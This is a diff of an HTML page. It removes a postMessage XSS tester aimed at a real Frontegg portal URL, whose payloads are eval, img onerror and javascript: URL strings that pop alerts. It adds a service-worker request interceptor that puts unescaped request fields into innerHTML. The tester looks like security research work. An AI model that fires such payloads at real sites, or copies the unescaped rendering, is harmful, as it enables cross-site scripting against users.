@@ -1,117 +1,315 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>PostMessage Tester</title>
-  <style>
-    body { font-family: Arial; padding: 20px; }
-    .payload { background: #f0f0f0; padding: 10px; margin: 10px 0; }
-    button { padding: 10px 20px; margin: 5px; }
-    #log { border: 1px solid #ccc; padding: 10px; max-height: 300px; overflow-y: auto; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request/Response Interceptor</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        
+        .controls {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .controls input {
+            width: 70%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        
+        .controls button {
+            padding: 10px 20px;
+            font-size: 14px;
+            background: #007bff;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
+        
+        .controls button:hover {
+            background: #0056b3;
+        }
+        
+        .layout {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+        }
+        
+        .panel {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .panel-header {
+            background: #333;
+            color: white;
+            padding: 10px 15px;
+            font-weight: bold;
+        }
+        
+        .iframe-container {
+            height: 500px;
+            border: none;
+        }
+        
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        .log-container {
+            height: 500px;
+            overflow-y: auto;
+            padding: 15px;
+        }
+        
+        .log-entry {
+            margin-bottom: 15px;
+            padding: 10px;
+            background: #f8f9fa;
+            border-left: 3px solid #007bff;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+        
+        .log-entry.error {
+            border-left-color: #dc3545;
+            background: #fff5f5;
+        }
+        
+        .log-url {
+            font-weight: bold;
+            color: #007bff;
+            word-break: break-all;
+            margin-bottom: 5px;
+        }
+        
+        .log-method {
+            display: inline-block;
+            padding: 2px 6px;
+            background: #28a745;
+            color: white;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-right: 5px;
+        }
+        
+        .log-status {
+            display: inline-block;
+            padding: 2px 6px;
+            background: #17a2b8;
+            color: white;
+            border-radius: 3px;
+            font-size: 11px;
+            margin-left: 5px;
+        }
+        
+        .log-body {
+            margin-top: 8px;
+            padding: 8px;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 150px;
+            overflow-y: auto;
+        }
+        
+        .log-timestamp {
+            color: #6c757d;
+            font-size: 11px;
+            margin-top: 5px;
+        }
+        
+        .status {
+            padding: 10px 15px;
+            background: #d4edda;
+            color: #155724;
+            border-radius: 4px;
+            margin-bottom: 20px;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+        }
+        
+        .clear-btn {
+            background: #6c757d !important;
+            float: right;
+        }
+        
+        .clear-btn:hover {
+            background: #545b62 !important;
+        }
+    </style>
 </head>
 <body>
-  <h1>🎯 Frontegg PostMessage Tester</h1>
-  
-  <div>
-    <label>Target URL:</label>
-    <input type="text" id="targetUrl" value="https://portal.frontegg.com/development/home#/admin-box/" style="width: 400px;">
-  </div>
-  
-  <h3>Test Payloads:</h3>
-  
-  <button onclick="testPayload1()">Test 1: eval() payload</button>
-  <div class="payload">
-    <code>{ overrideSignupFields: 'alert(document.domain)' }</code>
-  </div>
-  
-  <button onclick="testPayload2()">Test 2: innerHTML payload</button>
-  <div class="payload">
-    <code>{ html: '&lt;img src=x onerror=alert(1)&gt;' }</code>
-  </div>
-  
-  <button onclick="testPayload3()">Test 3: action payload</button>
-  <div class="payload">
-    <code>{ action: 'navigate', url: 'javascript:alert(1)' }</code>
-  </div>
-  
-  <button onclick="testPayload4()">Test 4: Custom payload</button>
-  <textarea id="customPayload" style="width: 100%; height: 60px;">{"test": "value"}</textarea>
-  
-  <h3>Victim Window:</h3>
-  <iframe id="victimFrame" width="800" height="400" style="border: 2px solid blue;"></iframe>
-  
-  <h3>Log:</h3>
-  <div id="log"></div>
-  
-  <script>
-    let victimWindow = null;
+    <div class="container">
+        <h1>🔍 Request/Response Interceptor</h1>
+        
+        <div id="status"></div>
+        
+        <div class="controls">
+            <input type="text" id="urlInput" placeholder="Enter URL to load in iframe (e.g., https://example.com)" value=https://player.vimeo.com/video/935884964?background=1">
+            <button onclick="loadUrl()">Load URL</button>
+            <button class="clear-btn" onclick="clearLog()">Clear Log</button>
+        </div>
+        
+        <div class="layout">
+            <div class="panel">
+                <div class="panel-header">📄 Iframe Content</div>
+                <div class="iframe-container">
+                    <iframe id="targetFrame" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
+                </div>
+            </div>
+            
+            <div class="panel">
+                <div class="panel-header">📊 Intercepted Requests & Responses</div>
+                <div class="log-container" id="logContainer">
+                    <p style="color: #6c757d;">Waiting for requests...</p>
+                </div>
+            </div>
+        </div>
+    </div>
     
-    function log(msg) {
-      const logDiv = document.getElementById('log');
-      const time = new Date().toLocaleTimeString();
-      logDiv.innerHTML += `[${time}] ${msg}<br>`;
-      logDiv.scrollTop = logDiv.scrollHeight;
-    }
-    
-    function loadVictim() {
-      const url = document.getElementById('targetUrl').value;
-      const iframe = document.getElementById('victimFrame');
-      iframe.src = url;
-      victimWindow = iframe.contentWindow;
-      log(`Loading victim: ${url}`);
-      
-      // Wait for load
-      iframe.onload = () => {
-        log('✅ Victim loaded');
-      };
-    }
-    
-    function sendPayload(payload) {
-      if (!victimWindow) {
-        loadVictim();
-        setTimeout(() => sendPayload(payload), 3000);
-        return;
-      }
-      
-      log(`Sending payload: ${JSON.stringify(payload)}`);
-      victimWindow.postMessage(payload, '*');
-      log('✅ Payload sent');
-    }
-    
-    function testPayload1() {
-      sendPayload({
-        overrideSignupFields: 'alert("XSS via eval: " + document.domain)'
-      });
-    }
-    
-    function testPayload2() {
-      sendPayload({
-        html: '<img src=x onerror=alert("XSS via innerHTML")>',
-        content: '<img src=x onerror=alert("XSS via innerHTML")>'
-      });
-    }
-    
-    function testPayload3() {
-      sendPayload({
-        action: 'navigate',
-        url: 'javascript:alert(document.domain)'
-      });
-    }
-    
-    function testPayload4() {
-      try {
-        const payload = JSON.parse(document.getElementById('customPayload').value);
-        sendPayload(payload);
-      } catch(e) {
-        log('❌ Invalid JSON: ' + e.message);
-      }
-    }
-    
-    // Auto-load on page load
-    window.onload = () => {
-      log('🚀 Tester ready');
-      loadVictim();
-    };
-  </script>
+    <script>
+        let logEntries = [];
+        
+        // Register Service Worker
+        if ('serviceWorker' in navigator) {
+            navigator.serviceWorker.register('/sw-proxy.js')
+                .then(registration => {
+                    console.log('Service Worker registered:', registration);
+                    showStatus('✅ Service Worker registered successfully! Ready to intercept requests.', false);
+                    
+                    // Listen for messages from service worker
+                    navigator.serviceWorker.addEventListener('message', event => {
+                        if (event.data.type === 'intercepted') {
+                            logRequest(event.data);
+                        }
+                    });
+                })
+                .catch(error => {
+                    console.error('Service Worker registration failed:', error);
+                    showStatus('❌ Service Worker registration failed. The page must be served over HTTPS or localhost.', true);
+                });
+        } else {
+            showStatus('❌ Service Workers not supported in this browser.', true);
+        }
+        
+        function showStatus(message, isError) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.className = isError ? 'status error' : 'status';
+            statusDiv.textContent = message;
+        }
+        
+        function loadUrl() {
+            const url = document.getElementById('urlInput').value;
+            const iframe = document.getElementById('targetFrame');
+            
+            if (!url) {
+                alert('Please enter a URL');
+                return;
+            }
+            
+            // Add https:// if not present
+            const fullUrl = url.match(/^https?:\/\//) ? url : 'https://' + url;
+            
+            iframe.src = fullUrl;
+            logMessage(`Loading: ${fullUrl}`);
+        }
+        
+        function logRequest(data) {
+            const entry = {
+                timestamp: new Date().toLocaleTimeString(),
+                url: data.url,
+                method: data.method,
+                status: data.status,
+                statusText: data.statusText,
+                bodyPreview: data.bodyPreview,
+                contentType: data.contentType
+            };
+            
+            logEntries.unshift(entry);
+            if (logEntries.length > 50) logEntries.pop(); // Keep last 50 entries
+            
+            renderLog();
+        }
+        
+        function logMessage(message) {
+            console.log(message);
+        }
+        
+        function renderLog() {
+            const container = document.getElementById('logContainer');
+            
+            if (logEntries.length === 0) {
+                container.innerHTML = '<p style="color: #6c757d;">Waiting for requests...</p>';
+                return;
+            }
+            
+            container.innerHTML = logEntries.map(entry => `
+                <div class="log-entry">
+                    <div>
+                        <span class="log-method">${entry.method}</span>
+                        <span class="log-status">${entry.status} ${entry.statusText}</span>
+                    </div>
+                    <div class="log-url">${entry.url}</div>
+                    ${entry.contentType ? `<div style="font-size: 11px; color: #6c757d;">Content-Type: ${entry.contentType}</div>` : ''}
+                    ${entry.bodyPreview ? `
+                        <div class="log-body">${escapeHtml(entry.bodyPreview)}</div>
+                    ` : '<div style="color: #6c757d; font-size: 11px; margin-top: 5px;">(No body preview available)</div>'}
+                    <div class="log-timestamp">${entry.timestamp}</div>
+                </div>
+            `).join('');
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        function clearLog() {
+            logEntries = [];
+            renderLog();
+        }
+        
+        // Load default URL on page load (after a short delay to ensure SW is ready)
+        setTimeout(() => {
+            loadUrl();
+        }, 1000);
+    </script>
 </body>
 </html>
